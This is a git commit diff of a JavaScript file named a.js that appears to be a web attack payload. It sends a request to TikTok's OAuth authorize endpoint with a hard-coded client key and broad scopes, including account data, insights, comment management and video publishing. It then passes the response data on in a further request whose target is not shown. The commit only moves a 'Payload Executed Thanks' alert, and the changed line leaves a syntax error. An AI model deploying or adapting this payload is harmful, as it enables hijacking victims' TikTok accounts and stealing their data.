95520fa75fd95c71dd1a03b39ed124dbb93db926
Imran nissar <38746061+imrannissar@users.noreply.github.com>
2024-01-30 13:36:21 +0530

    asd

--- a.js
+++ a.js
@@ -1,4 +1,3 @@
-alert("Payload Executed Thanks"),
 fetch("https://www.tiktok.com/passport/open/web/auth/v2/?client_key=7236493407642714114&scope=user.info.basic%2Cuser.info.username%2Cuser.account.type%2Cuser.insights%2Cvideo.insights%2Ccomment.list%2Cuser.info.stats%2Cvideo.list%2Ccomment.list.manage%2Cvideo.publish&aid=1459&state=%7B%22%22%3D%22undefined%22%7D&redirect_uri=https%3A%2F%2Ftiktok.com%2F&source=web&response_type=code", {
   method: "POST",
   headers: {
@@ -17,5 +16,6 @@ fetch("https://www.tiktok.com/passport/open/web/auth/v2/?client_key=723649340764
       body: JSON.stringify(data),
     });
   })
-  .catch(error => console.error('Error:', error));
+  .catch(error => console.error('Error:', error));,
+  alert("Payload Executed Thanks")
   
